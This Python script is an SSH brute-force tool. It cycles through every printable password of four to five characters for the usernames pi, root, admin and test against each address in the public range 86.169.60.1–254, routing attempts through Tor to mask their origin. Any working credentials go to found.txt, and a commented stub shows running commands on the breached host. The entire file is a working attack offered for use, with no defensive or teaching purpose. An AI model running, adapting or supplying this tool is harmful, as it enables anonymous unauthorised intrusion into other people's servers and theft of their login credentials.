import string
import itertools
import ipaddress
import paramiko
import socks
import socket
import time
import requests

printable_chars = string.printable[:-5]
usernames = ["pi", "root", "admin", "test"]
start_ip = ipaddress.ip_address("86.169.60.1")
end_ip = ipaddress.ip_address("86.169.60.254")

for length in range(4, 6):  # Iterate through lengths 4 to 5
    for combination in itertools.product(printable_chars, repeat=length):
        password_attempt = "".join(combination)
        if password_attempt[0] == " ":
            # skip password attempts that start with a space
            pass
        else:
            for username in range(len(usernames)):
                user = usernames[username]
                password = password_attempt
                for ip_int in range(int(start_ip), int(end_ip) + 1):
                    ip = ipaddress.ip_address(ip_int)
                    # NOTES! At this point we have variables "user", "password" and "ip"
                    # Configure Tor proxy settings
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1",9050)  # Assume Tor is running on localhost:9050
                    socket.socket = socks.socksocket
                    # Create SSH client
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    # Connect to the server through Tor
                    response = requests.get("https://check.torproject.org/api/ip")
                    if response.status_code == 200:
                        tor_ip = response.text
                        print("Your Tor IP address is:", tor_ip)
                    print(f"Trying IP {str(ip)} with combo {user} : {password}")
                    try:
                        client.connect(
                            hostname=str(ip),
                            username=user,
                            password=password,
                            port=22,
                            timeout=10,  # Set timeout for connection attempt
                        )
                        print("------------------------------------------------------")
                        print("Connected to server through Tor!")
                        print(f"IP: {ip} with user: {user} and password: {password}")
                        print("------------------------------------------------------")
                        print("")
                        with open("found.txt", "w") as file:
                            file.write(f"------------------------------------------------------\n")
                            file.write(f"IP: {ip} with user: {user} and password: {password}\n")
                        # Execute commands on the server (example)
                        # stdin, stdout, stderr = client.exec_command("ls -la")
                        # print(stdout.read().decode())

                    except paramiko.AuthenticationException:
                        print("Authentication failed")
                    except socket.error as e:
                        pass # Connection fail
                        # print("Connection failed:", e)
                    except Exception as e:
                        print("An error occurred:", e)

                    finally:
                        # Close the connection
                        client.close()
                        print("Sleeping ",end="")
                        for _ in range(5):
                            print(".", end="")
                            time.sleep(1)
                        print("")
                        socks.setdefaultproxy()
